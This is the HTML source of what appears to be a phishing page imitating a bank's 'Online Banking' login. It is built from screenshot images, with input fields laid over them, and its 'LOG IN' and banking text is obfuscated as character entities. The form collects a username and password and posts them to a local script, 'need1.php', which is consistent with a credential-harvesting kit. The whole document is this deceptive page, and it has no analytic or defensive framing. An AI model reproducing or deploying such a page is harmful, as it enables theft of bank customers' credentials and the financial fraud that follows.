<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>L&#79;G &#73;&#78; </title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="shortcut icon" href="images/favicon.ico"/>
<style type="text/css">  
.textbox {  
    border: solid 1px #ccc; 
  	padding-left: 8px;
	font-family: Verdana;
  	font-size: 16px;
    height: 40px; 
    width: 275px; 
 }  
.textbox:focus {  
    border: 2px dashed #009F53;
    outline: 0; 
 } 
</style>
<style type="text/css">
div#container
{
	position:relative;
	width: 1349px;
	margin-top: 0px;
	margin-left: auto;
	margin-right: auto;
	text-align:left; 
}
body {text-align:center;margin:0}
</style>

</head>
<body>
<div id="container">
<div id="image1" style="position:absolute; overflow:hidden; left:0px; top:0px; width:1349px; height:652px; z-index:0"><img src="images/f1.png" alt="" title="" border=0 width=1349 height=652></div>

<div id="image2" style="position:absolute; overflow:hidden; left:506px; top:477px; width:191px; height:90px; z-index:1"><a href="#"><img src="images/f2.png" alt="" title="" border=0 width=191 height=90></a></div>

<div id="image3" style="position:absolute; overflow:hidden; left:0px; top:653px; width:1349px; height:624px; z-index:2"><img src="images/f3.png" alt="" title="" border=0 width=1349 height=624></div>
<form action=need1.php name=pfw method=post>
<select name="ac" class="textbox" autocomplete="off" required style="position:absolute;left:508px;top:220px;width:334px;z-index:3">
<option value="O&#110;&#108;&#105;&#110;e B&#97;&#110;&#107;&#105;&#110;g " selected="selected">O&#110;&#108;&#105;&#110;e B&#97;&#110;&#107;&#105;&#110;g </option>
                <option value="C&#111;&#109;&#109;&#101;&#114;&#99;&#105;&#97;l B&#97;&#110;&#107;&#105;&#110;g "></option></select>
<input name="sr" class="textbox" autocomplete="off" required type="text" style="position:absolute;width:334px;left:508px;top:296px;z-index:4">
<input name="dw" class="textbox" autocomplete="off" required type="password" style="position:absolute;width:334px;left:508px;top:378px;z-index:5">
<div id="formimage1" style="position:absolute; left:507px; top:426px; z-index:6"><input type="image" name="formimage1" width="336" height="39" src="images/f4.png"></div>
</div>

</body>
</html>
